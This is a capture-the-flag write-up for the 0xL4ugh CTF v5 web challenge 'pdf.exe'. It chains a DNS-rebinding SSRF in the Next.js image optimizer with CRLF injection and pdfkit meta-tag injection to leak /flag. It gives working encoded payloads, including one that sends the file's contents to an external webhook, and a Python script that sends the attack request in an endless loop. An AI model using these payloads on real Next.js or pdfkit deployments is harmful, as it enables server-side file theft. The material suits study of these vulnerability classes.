---
title: "pdf.exe - 0xL4ugh CTF v5"
category: "web"
subcategory: "stack"
type: "writeup"
tags: ["0day", "web", "research", "canary", "ssrf", "race-condition", "flask", "werkzeug", "polyglot", "nextjs", "dns-rebinding", "stack", "0xl4ugh-ctf", "0xl4ugh-ctf-v5", "ctf-writeup"]
summary: "![00xCanelo](<https://medium.com/@00xCanelo?source=postpage---byline--643455d4e05f--------------------------------------->)"
source:
  name: "CTFtime writeup #40538"
  url: "https://ctftime.org/writeup/40538"
original_source: "https://medium.com/@00xCanelo/pdf-exe-0xl4ugh-v5-ctf-643455d4e05f"
ctf:
  name: "0xL4ugh CTF v5"
  challenge: "pdf.exe"
---

## Metadata

- **CTF:** 0xL4ugh CTF v5
- **Task:** pdf.exe
- **Author team:** Mont5ab El2hwa
- **CTFtime tags:** 0day, web, research
- **CTFtime:** <https://ctftime.org/writeup/40538>
- **Original writeup:** <https://medium.com/@00xCanelo/pdf-exe-0xl4ugh-v5-ctf-643455d4e05f>

---
pdf.exe | 0xL4ugh v5 CTF  
========================

[![00xCanelo](<https://miro.medium.com/v2/resize:fill:64:64/1*U5GIuVeL21tx01WIhHWWqQ.png>)](<https://medium.com/@00xCanelo?source=post_page---byline--643455d4e05f--------------------------------------->)

[00xCanelo](<https://medium.com/@00xCanelo?source=post_page---byline--643455d4e05f--------------------------------------->)

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IDAI3O2YMfKzCtJGancP6Q.png>)

To start with, I want to thank the author:

[Omar M. Hasan](<https://medium.com/u/b347988fc07a?source=post_page---user_mention--643455d4e05f--------------------------------------->)

and 0xl4ugh Team for this amazing challenge  
here is a summary for the challenge:  
1- This is a nextjs challenge which generates a pdf using pdfkit  
2- we only have the page.tsx which is visible and publicly accessible  
3- any other logic anything can help us read the flag is not accessible and internal

challenge url :  
[http://pdf.webctf.online/](http://pdf.webctf.online/)

Now lets begin with the source code :  
/internal/[app.py](http://app.py)

```  
import os  
import time  
from urllib.request import urlopen  
from flask import Flask, request, send_from_directory, jsonify, abort  
from werkzeug.utils import secure_filename  
import pdfkit  
# ---  
app = Flask(__name__)  
BASE_DIR = os.path.dirname(os.path.abspath(__file__))  
SHARED_DIR = os.path.join(BASE_DIR, 'reports')  
os.makedirs(SHARED_DIR, exist_ok=True)  
# ---  
def get_system_report(content_disposition="attachment; filename=\"report.txt\""):  
"""  
Generates the text report containing system info.  
"""  
report = f"{content_disposition}\n\n"  
report += os.popen("uname -a && echo && uptime && echo && whoami").read()  
return report  
def fetch_pdf_report(data_uri, filename):  
"""  
Parses the data URI and constructs the report content.  
Returns the report string on success, or None on failure.  
"""  
try:  
response = urlopen(data_uri)  
info = [response.info](http://response.info)()  
  
raw_body = response.read()  
cd_header = info.get("Content-Disposition")  
  
if cd_header:  
final_cd = f'{cd_header}; id="{raw_body}"; filename="{filename}"'  
else:  
final_cd = f'attachment; filename="{filename}"'  
return get_system_report(final_cd)  
except Exception:  
return None  
# ---  
@app.route('/generate', methods=['GET'])  
def generate_pdf():  
data_uri = request.args.get('data')  
if not data_uri:  
return jsonify({"error": "Missing 'data' parameter"}), 400  
  
if not data_uri.startswith("data:plain/text"):  
return jsonify({"error": "Invalid data format"}), 400  
timestamp = int(time.time())  
filename = f"report_{timestamp}.pdf"  
  
content = fetch_pdf_report(data_uri, filename)  
if content is None:  
return jsonify({"error": "Failed to fetch report content"}), 500  
  
output_path = os.path.join(SHARED_DIR, filename)  
try:  
pdfkit.from_string(content, output_path)  
return jsonify({"message": "PDF generated", "filename": filename})  
except Exception:  
return jsonify({"error": "Failed to generate PDF"}), 500  
# ---  
@app.route('/pdfs', methods=['GET'])  
def list_pdfs():  
files = [f for f in os.listdir(SHARED_DIR) if f.endswith('.pdf')]  
return jsonify({"files": files})  
# ---  
@app.route('/pdfs/<filename>', methods=['GET'])  
def download_pdf(filename):  
safe_filename = secure_filename(filename)  
  
if safe_filename != filename:  
return abort(400, description="Invalid filename")  
  
file_path = os.path.join(SHARED_DIR, safe_filename)  
if not os.path.exists(file_path):  
return abort(404, description="File not found")  
return send_from_directory(SHARED_DIR, safe_filename, as_attachment=True)  
# ---  
if __name__ == '__main__':  
app.run(host='0.0.0.0', port=5000)  
```

/prod/app/page.tsx

```  
"use client";  
import { useEffect, useState } from "react";  
import { getPdfs } from "../actions";  
const PASSWORD = "REDACTED";  
export default function Home() {  
const [files, setFiles] = useState<string[]>([]);  
const [authed, setAuthed] = useState(false);  
useEffect(() => {  
if (typeof window !== "undefined") {  
setAuthed(localStorage.getItem("passcode") === PASSWORD);  
}  
}, []);  
useEffect(() => {  
if (authed) {  
getPdfs().then((data) => setFiles(data.files));  
}  
}, [authed]);  
if (!authed) {  
return <main style={{textAlign:'center',marginTop:'20vh'}}><h2>Login required</h2></main>;  
}  
return (  
<main>  
<h1>PDF List</h1>  
<table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '1em' }}>  
<thead>  
<tr>  
<th style={{ textAlign: 'left', borderBottom: '2px solid var(--accent)', padding: '0.5em' }}>File Name</th>  
</tr>  
</thead>  
<tbody>  
{files.length === 0 ? (  
<tr><td style={{ padding: '0.5em' }}>No PDFs found.</td></tr>  
) : (  
files.map((file) => (  
<tr key={file}>  
<td style={{ padding: '0.5em', borderBottom: '1px solid #4442' }}>{file}</td>  
</tr>  
))  
)}  
</tbody>  
</table>  
</main>  
);  
}  
```

There are other files i will try to provide the challenge source code inshallah

Lets start solving at first i will move it step by step  
1- find a way to access the internal files  
2- use the intenral files to get RCE or find a way to get the flag

But there is a problem that is a simple nextjs application with simple image configuration in next.config.ts

```  
import type { NextConfig } from 'next'  
  
const nextConfig: NextConfig = {  
images: {  
remotePatterns: [{ protocol: "http", hostname: "**" }]  
}  
}  
  
export default nextConfig  
```

To be honest while solving I started to search for researches and lot of stuff with this keyword  
Next Js Redirect Based SSRF

until I found this blog that I recommend you to read it

[From CVE to Closure: My Journey Exploring SSRF in Next.js 13.5.1 (CVE-2024–34351)  
\---------------------------------------------------------------------------------

### “Sometimes it’s not the version, but the vision.”

[medium.com](https://medium.com)](<https://medium.com/@yashprajapati791/from-cve-to-closure-my-journey-exploring-ssrf-in-next-js-13-5-1-cve-2024-34351-ae32f3878c84?source=post_page-----643455d4e05f--------------------------------------->)

after reading it i found this endpoint

```  
/_next/image?url=  
```

but we have to add the w= and q= , so I took this payload that he made :

```  
/_next/image?url=[https://scope.s3.amazonaws.com/uploads/ssrf_polyglot.png&w=128&q=75](https://scope.s3.amazonaws.com/uploads/ssrf_polyglot.png&w=128&q=75)  
```

but i decided to add my own burp collab to see what is going on and sent the request

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1uY01k36CIcEHim8EldsZw.png>)

when i returned back to the collab i got some connection

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7qxtH32jm58ch-4hx2j0AA.png>)

i tried alot of things but nothig worked for me i decided to search for the part responsible for this in the nextjs so i asked gpt to give me the file or function that is reponsible for it

[next.js/packages/next/src/server/image-optimizer.ts at canary · vercel/next.js  
\------------------------------------------------------------------------------

### The React Framework. Contribute to vercel/next.js development by creating an account on GitHub.

[github.com](https://github.com)](<https://github.com/vercel/next.js/blob/canary/packages/next/src/server/image-optimizer.ts?source=post_page-----643455d4e05f--------------------------------------->)

so after some analysis (Alot) I found the function responsible for it fetchExternalImage and started to analyze it

I found this parts of the code

```  
if (!dangerouslyAllowLocalIP) {  
const { hostname } = new URL(href)  
let ips = [hostname]  
if (!isIP(hostname)) {  
const records = await lookup(hostname, {  
family: 0,  
all: true,  
hints: ALL,  
}).catch((_) => [{ address: hostname }])  
ips = records.map((record) => record.address)  
}  
const privateIps = ips.filter((ip) => isPrivateIp(ip))  
if (privateIps.length > 0) {  
Log.error(  
'upstream image',  
href,  
'resolved to private ip',  
JSON.stringify(privateIps)  
)  
throw new ImageError(400, '"url" parameter is not allowed')  
}  
}  
const res = await fetch(href, {  
signal: AbortSignal.timeout(7_000),  
redirect: 'manual',  
}).catch((err) => err as Error)  
```

Here we can see this line

```  
const { hostname } = new URL(href)  
```

makes Initial URL Parsing  
and then on the next part

```  
let ips = [hostname]  
if (!isIP(hostname)) {  
const records = await lookup(hostname, {  
family: 0,  
all: true,  
hints: ALL,  
}).catch((_) => [{ address: hostname }])  
ips = records.map((record) => record.address)  
}  
```

check for the host using lookup

```  
const privateIps = ips.filter((ip) => isPrivateIp(ip))  
if (privateIps.length > 0) {  
throw new ImageError(400, '"url" parameter is not allowed')  
}  
```

private ip filter which was very weak can be bypassed using DNS rebinding

```  
const res = await fetch(href, {  
signal: AbortSignal.timeout(7_000),  
redirect: 'manual',  
})  
```

it fetches the url or image

After some analysis and help of an AI He told me this is a

TOCTOU => Time Of Check to Time Of Use  
simply It checks for the host and then use it so we can use a DNS Rebinding in this case and see what we will get

To generate a rebinder i will use this website  
[<https://lock.cmpxchg8b.com/rebinder.html>](<https://lock.cmpxchg8b.com/rebinder.html>)

add the host on B to the ip of [google.com](https://google.com)

![captionless image](<https://miro.medium.com/v2/resize:fit:1056/format:webp/1*wew7QM-MngI76vmsXl0YtQ.png>)

like this

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8D0cJSUO2Je-uwmUSW_UoA.png>)

for now we have the way to make a ssrf we got the first 0day now we need to find a way to read or get the flag

move to part 2

in [app.py](http://app.py) we have this library

```  
import pdfkit  
```

with some research I found this page

[The Python Pdfkit Library Vulnerability  
\---------------------------------------

### Security analysts of [CSIRT.SK](http://CSIRT.SK) discovered a vulnerability in the Python pdfkit library is caused by parsing…

[csirt.sk](http://csirt.sk)](<https://csirt.sk/the-python-pdfkit-library-vulnerability.html?source=post_page-----643455d4e05f--------------------------------------->)

After reading it you will come up with a payload like this

```  
<meta name="pdfkit-post-file" content=""> <meta name="pdfkit-leak-data" content="/flag"> <meta name="pdfkit-https://YOUDOMAIN/?q=--" content="--cache-dir">  
```

But now we need to generate it we can simply send it to the generate but we have to take a look on this function

```  
def fetch_pdf_report(data_uri, filename):  
"""  
Parses the data URI and constructs the report content.  
Returns the report string on success, or None on failure.  
"""  
try:  
response = urlopen(data_uri)  
info = [response.info](http://response.info)()  
  
raw_body = response.read()  
cd_header = info.get("Content-Disposition")  
  
if cd_header:  
final_cd = f'{cd_header}; id="{raw_body}"; filename="{filename}"'  
else:  
final_cd = f'attachment; filename="{filename}"'  
return get_system_report(final_cd)  
except Exception:  
return None  
```

So My Ai Told me there is CRLF and gave me this final payload

```  
data:plain/text  
Content-Disposition:<meta name="pdfkit-post-file" content=""> <meta name="pdfkit-leak-data" content="/flag"> <meta name="pdfkit-https://YOURDOMAIN?q=--" content="--cache-dir">,canelo  
```

Now with simple url encode

```  
data:plain/text%0AContent-Disposition:%3Cmeta%20name=%22pdfkit-post-file%22%20content=%22%22%3E%20%3Cmeta%20name=%22pdfkit-leak-data%22%20content=%22/flag%22%3E%20%3Cmeta%20name=%22pdfkit-https://YOURDOMAIN/?q=--%22%20content=%22--cache-dir%22%3E,canelo  
```

Now lets use or DNS rebinding and add this to the generate endpoint

```  
<http://7f000001.8efac8ce.rbndr.us:5000/generate?data=data:plain/text%0AContent-Disposition:%3Cmeta%20name=%22pdfkit-post-file%22%20content=%22%22%3E%20%3Cmeta%20name=%22pdfkit-leak-data%22%20content=%22/flag%22%3E%20%3Cmeta%20name=%22pdfkit-https://YOURDOMAIN/?q=--%22%20content=%22--cache-dir%22%3E,canelo>  
```

Now give it another url encode

```  
http%3A%2F%[2F7f000001.8efac8ce.rbndr.us](http://2F7f000001.8efac8ce.rbndr.us)%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2FYOURDOMAIN%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo  
```

dont forget to add your webhook

I made this python script to send request and send the flag to my webhook

```  
import requests  
import time  
paylaod = "http%3A%2F%[2F7f000001.8efac8ce.rbndr.us](http://2F7f000001.8efac8ce.rbndr.us)%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2Fwebhook.site%2F71f66f91-fb0d-4b79-b78a-d4b1ebfcb036%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo"  
r = f"http://pdf.webctf.online/_next/image?url={paylaod}&w=256&q=75&"  
print("Attack started check your webhook")  
while True:  
_ = requests.get(r)  
time.sleep(0.1)  
```

now check your webhook

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CJbpJBggzs6qKYdv1xFvMQ.png>)

Nice we got the flag lets download it and read it

![captionless image](<https://miro.medium.com/v2/resize:fit:1284/format:webp/1*01Zw-_yr6peS8MjdRkICuw.png>)

Thanks for Reading You can view the author writeup

[<https://mushroom.cat/ctf/nextjs-ssrf-python-crlf-pdfkit-injection>](<https://mushroom.cat/ctf/nextjs-ssrf-python-crlf-pdfkit-injection>)

[GITHUB](<https://github.com/00xCanelo>) [TEAM](<https://ctftime.org/team/402823>)

This Write up is made by:

![captionless image](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LUW4Ka_uBrWa5nDwA5EwTw.jpeg>)
